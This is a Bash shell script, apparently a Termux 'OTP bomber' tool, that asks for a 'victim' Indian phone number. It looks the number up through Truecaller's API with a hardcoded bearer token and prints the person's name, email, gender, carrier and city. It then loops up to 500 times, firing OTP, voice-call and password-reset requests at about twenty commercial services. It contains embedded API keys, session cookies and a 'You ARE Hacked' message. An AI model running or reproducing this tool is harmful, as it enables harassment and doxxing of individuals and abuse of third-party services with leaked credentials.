info(){
echo
echo -e "\e[31m\e[1m[^^] About Us   :\e[0m\e[1m"
echo -e "\e[33m\e[1m[^^] \e[0m\e[1mCoder  \t\e[91m\e[1m:  \e[92m\e[1mParixit Sutariya"
echo -e "\e[33m\e[1m[^^] \e[0m\e[1mGithub  \t\e[91m\e[1m:  \e[92m\e[1mgithub.com/Bhai4You"
echo -e "\e[33m\e[1m[^^] \e[0m\e[1mBlog    \t\e[91m\e[1m:  \e[92m\e[1mbhai4you.blogspot.com"
echo -e "\e[33m\e[1m[^^] \e[0m\e[1mDate  \t\e[91m\e[1m:  \e[92m\e[1m06-04-2022\e[92m\e[0m\e[92m\e[1m"
echo
echo -e "\e[31m\e[1m[^^] Victim     :\e[0m\e[1m"
echo -e "\e[33m\e[1m[^^] \e[0m\e[1mNumber  \t\e[91m\e[1m:  \e[92m\e[1m+91$varnum"
echo -e "\e[33m\e[1m[^^] \e[0m\e[1mVictim  \t\e[91m\e[1m:  \e[92m\e[1m$(cat .name)"
echo -e "\e[33m\e[1m[^^] \e[0m\e[1mEmail  \t\e[91m\e[1m:  \e[92m\e[1m$(cat .email)"
echo -e "\e[33m\e[1m[^^] \e[0m\e[1mGender  \t\e[91m\e[1m:  \e[92m\e[1m$(cat .gender)"
echo -e "\e[33m\e[1m[^^] \e[0m\e[1mSimcard  \t\e[91m\e[1m:  \e[92m\e[1m$(cat .sim)"
echo -e "\e[33m\e[1m[^^] \e[0m\e[1mCity  \t\e[91m\e[1m:  \e[92m\e[1m$(cat .city)"
echo
echo -e "\e[31m\e[1m[^^] OTP Info   :\e[0m\e[1m"
echo -e "\e[33m\e[1m[^^] \e[0m\e[1mOTP Sent  \t\e[91m\e[1m:  \e[92m\e[1m$n\e[92m\e[0m\e[92m\e[1m"
echo -e "\e[33m\e[1m[^^] \e[0m\e[1mCall OTP  \t\e[91m\e[1m:  \e[92m\e[1m$c\e[92m\e[0m\e[92m\e[1m"
echo
echo -e "\e[31m\e[1m[CTRL + C] \e[0m\e[1mStop attack  \t\e[91m\e[1m"
echo
}
req(){
command -v python > /dev/null 2>&1 || { echo >&2 "...";clear;echo "";echo "";echo "[^^] Python Installing...";pkg install python -y;clear; }
command -v lolcat > /dev/null 2>&1 || { echo >&2 "...";echo "";echo "";echo "[^^] lolcat Installing...";pip install lolcat;clear; }
command -v jq > /dev/null 2>&1 || { echo >&2 "...";echo "";echo "";echo "[^^] JQ Installing...";pkg install jq -y;clear; }
}
n=1
c=1
number(){
echo
echo
rm -rvf .name .sim .city .gender .email &> /dev/null
printf "Enter victim number : +91"
read varnum
curl -k -X GET "https://search5-noneu.truecaller.com/v2/search?q=$varnum&countryCode=in&type=10&placement=SEARCHRESULTS%2CHISTORY%2CDETAILS&adId=c532a019-1768-419a-8fea-c79531bfd535&encoding=json" -H "accept: application/json" -H "authorization: Bearer a1i0j--YbZkMnVE-5Gs-Caf_yFqAOSvptwyVFx6rhnjM81EDtzETMtFwC6JbpTBQ" >> data.json
cat data.json | jq -r '.data | .[] | .name' > .name
cat data.json | jq -r '.data | .[] | .phones | .[] | .carrier' > .sim
cat data.json | jq -r '.data | .[] | .addresses | .[] | .city' > .city
cat data.json | jq -r '.data | .[] | .gender' > .gender
cat data.json | jq -r '.data | .[] | .internetAddresses | .[] | .id' > .email
rm -f data.json &> /dev/null
clear
}
otp(){
curl -X GET https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=$varnum&newOtp=true &> /dev/null
curl -X POST https://mtnucleus.byjusweb.com/api/acs/v2/send-otp -H "Content-Type: application/json" --data-binary @- <<DATA &> /dev/null
{
"phoneNumber": "$varnum",
"page": "free-trial-classes"
}
DATA
curl -X POST https://unacademy.com/api/v3/user/user_check/ -H "Content-Type: application/json" -d "{\"phone\":\"$varnum\",\"country_code\":\"IN\",\"otp_type\":1,\"email\":\"\",\"send_otp\":true,\"is_un_teach_user\":false}" &> /dev/null
curl -X POST https://api.dominos.co.in/loginhandler/forgotpassword -H "Content-Type: application/json" -H "api_key: X24EZOH3IL" -d "{\"lastName\":\"\",\"mobile\":\"$varnum\",\"firstName\":\"\"}" &> /dev/null
((n++))
curl -X POST https://login.housing.com/api/v2/send-otp -H "Accept: */*" -H "Content-Type: application/json" -d "{\"phone\":\"$varnum\"}" &> /dev/null
curl -X POST https://web.okcredit.in/api/authn/v1.0/otp:request -H "Accept: */*" -H "Content-Type: application/json" -d "{\"mobile\":\"$varnum\",\"mode\":0}" &> /dev/null
((n++))
curl -X POST https://www.snapdeal.com/sendOTP -H "Accept: */*" -H "Content-Type: application/x-www-form-urlencoded" -d "mobileNumber=$varnum&purpose=LOGIN_WITH_MOBILE_OTP" &> /dev/null
curl -X POST https://api.crofarm.com/cons/consumer/otp/v1/ -H "Host: api.crofarm.com" -H "accept: application/json" -H "app-client: android" -H "app-version: 4194420" -H "unique-id: 14ad52bf71d07d9d" -H "newrelic: eyJ2IjpbMCwyXSwiZCI6eyJkLnR5IjoiTW9iaWxlIiwiZC5hYyI6IjEzOTE0ODUiLCJkLmFwIjoiMTEzMzgzMjE1NCIsImQudHIiOiI4MzA1ZTVmYTUzZGU0Y2Y4ODQ1MDY4NTQ5ODNmOTlkNSIsImQuaWQiOiI3Yjc5N2ZhMjViZGI0MTFhIiwiZC50aSI6MTY1MDI3OTg1NDEwMX19" -H "tracestate: @nr=0-2-1391485-1133832154-7b797fa25bdb411a----1650279854101" -H "traceparent: 00-8305e5fa53de4cf884506854983f99d5-7b797fa25bdb411a-00" -H "Content-Type: application/json" -H "content-length: 39" -H "accept-encoding: gzip" -H "user-agent: okhttp/4.9.1" -H "x-newrelic-id: VQUOUFJbDRABVVJRDwIFV1EF" -d "{\"phone\":\"$varnum\",\"is_voice_otp\":1}" &> /dev/null
((n++))
curl -X POST https://callers.me/api/new/method/update/app.smsV2.inc.php -H "Accept: */*" -H "Content-Type: application/x-www-form-urlencoded" -d "country=IN&phone=$varnum&countrycode=91&" &> /dev/null
curl -X POST https://production.apna.co/api/userprofile/v1/otp/ -H "Host: production.apna.co" -H "accept: application/json" -H "user-agent: Android 10; Bull Anonymous" -H "Content-Type: application/json" -H "content-length: 103" -d "{\"hash_type\":\"play_store\",\"phone_number\":\"91$varnum\",\"request_id\":\"JlAvy_1650259719929\",\"retries\":0}" &> /dev/null
((n++))
curl -X POST https://api.crofarm.com/users/fotp/v1/ -H "Host: api.crofarm.com" -H "app-client: OtipyBiz" -H "client: android" -H "app-version: 10080" -H "tracestate: @nr=0-2-1391485-1131658503-02f25624e4a549da----1650280353309" -H "traceparent: 00-c3bd897d368d45ad8d080493820554a1-02f25624e4a549da-00" -H "newrelic: eyJ2IjpbMCwyXSwiZCI6eyJkLnR5IjoiTW9iaWxlIiwiZC5hYyI6IjEzOTE0ODUiLCJkLmFwIjoiMTEzMTY1ODUwMyIsImQudHIiOiJjM2JkODk3ZDM2OGQ0NWFkOGQwODA0OTM4MjA1NTRhMSIsImQuaWQiOiIwMmYyNTYyNGU0YTU0OWRhIiwiZC50aSI6MTY1MDI4MDM1MzMwOX19" -H "Content-Type: application/json" -H "content-length: 39" -H "accept-encoding: gzip" -H "user-agent: okhttp/4.2.1" -H "x-newrelic-id: VQUOUFJbDRABVVJTAQQPU1QC" -d "{\"phone\":\"$varnum\",\"is_voice_otp\":1}" &> /dev/null
curl -X POST https://api.cdn.mydash101.com/OTP/welcome?mobileNumber=$varnum&isFourDigit=false -H "ExceptionInTry: authToken null or empty" -H "X-App-Version: 3.30.1" -H "X-DeviceId: 56bfaaf5c6051cca" -H "X-Device-Type: android" -H "X-Device-Name: GM1901" -H "User-Agent: Shop101/3.30.1/Android/GM1901/10/56bfaaf5c6051cca" -H "Business-Type: marketplace" -H "Content-Length: 0" -H "Host: api.cdn.mydash101.com" -H "Connection: Keep-Alive" -H "Accept-Encoding: gzip" -H "Content-Type: application/json" &> /dev/null
((n++))
curl -X POST https://api.pharmeasy.in/v3/users/send-otp -H "Host: api.pharmeasy.in" -H "x-default-city: 10" -H "x-pincode: 380001" -H "x-is-default-network-pincode: no" -H "x-os-version: 10" -H "x-phone-manufacturer: Error" -H "x-phone-platform: android" -H "x-app-version: 4.10.34" -H "x-api-auth: u_w4vNCETkFrNXF_k7ZNeSrNoEb0xBIbjlzX6mZvCvOljEwOTKr-6gZg8RfvflihsT9UIxP1G1nZqgejoTP5Fg" -H "x-appsflyer-id: 1650263155417-1115644853594533545" -H "x-ab-experiments: /yd7ImV4cGVyaW1lbnRzIjpbeyJpZCI6IkIiLCJuYW1lIjoicmVjb19kaWFnX2hvbWVfdjEifSwmAATvY2FydF9mYnRfNTBfNTAoAAc/b3RjJwABFkF1ANdzaWxpY29uX2V4cF82cgAHIwABmADwAnNpbWlsYXJfNTBfNTAifV19" -H "x-device-id: 15736a8c785560fe" -H "x-session-id: s_a_15736a8c785560fe_fb07c618-380a-4f3a-820a-144a193b09b6" -H "Content-Type: application/x-www-form-urlencoded" -H "content-length: 24" -H "accept-encoding: gzip" -H "user-agent: okhttp/5.0.0-alpha.4" -d "contactNumber=$varnum" &> /dev/null
curl -X POST http://api.dailyfarmweb.com/api/User/SendSmsCode -H "Content-Type: application/json" -H "Content-Length: 627" -H "Host: api.dailyfarmweb.com" -H "Connection: Keep-Alive" -H "Accept-Encoding: gzip" -H "User-Agent: okhttp/4.9.1" -d "{\"data\":{\"VType\":0,\"Mobile\":\"$varnum\"},\"appVer\":\"2.9.3\",\"ip\":\"157.32.25.52\",\"channel\":\"AA082\",\"nonce\":\"af00beeea43241a4b2fc418f65e22d1e\",\"deviceID\":\"565ef7270abd3bb9\",\"pushToken\":\"cwSKhnMESOiJ3q9yH34V9u:APA91bFyI9gfaw39B07X2TXXI14CUnk48I1sa6T4eyGwUPm0ntNSbBZxpIV_34y3CjaEGXn8x6rtkjGpsEdHU6_TxDb7fmn0EEpBcDIMOinQdAGMtqwF6aoJCmeLqyYUMjpafyau-W9o\",\"osVer\":\"10\",\"uid\":\"-1\",\"signdata\":\"X2xT3hVDybjAq58XOKbGp4uONCsKyKCfksgSoMWwzkYFZPy9YDIyHpiuZWbU2kwgQHn1I2eC53cp\nm6lD/ftkYWJh9QjdrUiUJVhJk9UWSEkV2UZJNJoW3OqO9zLh7rw3bEZU49ErPnUxMHqaO2aFB+DE\nZwfLUqSfcu+4Yjozpyg=\n\",\"osType\":0,\"memberToken\":\"\",\"timestamp\":\"1650280722\",\"cID\":\"3\"}" &> /dev/null
((n++))
curl -X POST http://api.cattletownweb.com/api/User/SendSmsCode -H "Content-Type: application/json" -H "Content-Length: 449" -H "Host: api.cattletownweb.com" -H "Connection: Keep-Alive" -H "Accept-Encoding: gzip" -H "User-Agent: okhttp/4.9.1" -d "{\"data\":{\"VType\":0,\"Mobile\":\"$varnum\"},\"appVer\":\"2.9.2\",\"ip\":\"157.32.25.52\",\"channel\":\"AA051\",\"nonce\":\"15ff9619ded54117b2c1e066494b49e8\",\"deviceID\":\"5cb7a773e6a7a077\",\"osVer\":\"10\",\"uid\":\"-1\",\"signdata\":\"Xe8rFyYI+2YUMVjdLWmRpYzwPsMxOd8gRbTChgz1E3gfkjXIoHJZcXIvHI+Fvscvvrybb6fuvtE0\nLX9RF5dpzJqnGh/nWArpo/nnukfFQ/b0Ont46PVZBDVn6Wsg1L8tJAay+yY3sOrMaBcSoz5h+Lg7\n7Fz+SoEveU6XLAqMguQ=\n\",\"osType\":0,\"memberToken\":\"\",\"timestamp\":\"1650280973\",\"cID\":\"3\"}" &> /dev/null
curl -X GET https://crm.agrostar.in/userservice/otp/?app=AgroStar&phoneNumber=$varnum &> /dev/null
((n++))
curl -X POST https://service.aasaan.shop/api/v1/stores/accounts/checkMobileNumber -H "Host: service.aasaan.shop" -H "content-length: 58" -H "accept: application/json, text/plain, */*" -H "origin: http://localhost" -H "user-agent: Mozilla/5.0 (Linux; Android 10; Bull Anonymous)" -H "sec-fetch-mode: cors" -H "Content-Type: application/json" -H "x-requested-with: shop.aasaan.app" -H "sec-fetch-site: cross-site" -H "referer: http://localhost/auth/register/phone" -H "accept-encoding: gzip, deflate" -H "accept-language: en-IN,en-US;q=0.9,en;q=0.8" -d "{\"data\":{\"mobileNumber\":\"$varnum\",\"countryCode\":\"+91\"}}" &> /dev/null
curl -X POST https://api.apollo247.com//graphql -H "accept: */*" -H "authorization: Bearer 3d1833da7020e0602165529446587434" -H "Content-Type: application/json" -H "Content-Length: 357" -H "Host: api.apollo247.com" -H "Connection: Keep-Alive" -H "Accept-Encoding: gzip" -H "User-Agent: okhttp/4.9.2" -d "{\"operationName\":\"Login\",\"variables\":{\"mobileNumber\":\"+91$varnum\",\"loginType\":\"PATIENT\",\"hashCode\":\"oYNCuWtz4V4\"},\"query\":\"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!, $hashCode: String) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType, hashCode: $hashCode) {\n    status\n    message\n    loginId\n    __typename\n  }\n}\n\"}" &> /dev/null
((n++))
curl -X POST https://api.apollo247.com//graphql -H "accept: */*" -H "authorization: Bearer 3d1833da7020e0602165529446587434" -H "Content-Type: application/json" -H "Content-Length: 378" -H "Host: api.apollo247.com" -H "Connection: Keep-Alive" -H "Accept-Encoding: gzip" -H "User-Agent: okhttp/4.9.2" -d "{\"operationName\":\"getOTPOnCall\",\"variables\":{\"mobileNumber\":\"+91$varnum\",\"loginType\":\"PATIENT\",\"id\":\"cd8d43b0-bf0d-11ec-aae7-5d492e1abb91\"},\"query\":\"query getOTPOnCall($mobileNumber: String, $loginType: LOGIN_TYPE, $id: String!) {\n  getOTPOnCall(mobileNumber: $mobileNumber, loginType: $loginType, id: $id) {\n    status\n    loginId\n    message\n    __typename\n  }\n}\n\"}" &> /dev/null
((c++))
curl -X POST https://aayu.medcords.com/send_registration_otp -H "X-User-Agent: 29, Bull Anonymous" -H "Content-Type: application/json" -H "Content-Length: 84" -H "Host: aayu.medcords.com" -H "Connection: Keep-Alive" -H "Accept-Encoding: gzip" -H "Cookie: session_id=e0c382f23ec93e487fe5848b256f6ee584f078e2" -H "User-Agent: okhttp/4.9.0" -d "{\"containHash\":false,\"resend\":false,\"phoneNumber\":\"$varnum\",\"whatsappOptState\":1}" &> /dev/null
curl -X GET https://control.msg91.com/api/sendotp.php?authkey=353492AmEUBras9Mr601cc3ccP1&DLT_TE_ID=1307164422845327389&sender=ERNESY&mobile=917434963238&country=91&message=You+ARE+Hacked+%23%23OTP%23%23.+Please+do+not+share+it+with+anybody.+Team+EarnEasy&otp_length=4&userip=192.168.43.69&unicode=0&for_panel_id=1&route=106&response=json&mobiles=91$varnum&invisible_request_id=326472715853363532373933 &> /dev/null
((c++))
((n++))
} &> /dev/null
req
clear
logo3 | lolcat
number
while [ $n -le 500 ]
do
clear
logo3 | lolcat
info
otp
sleep 1
done
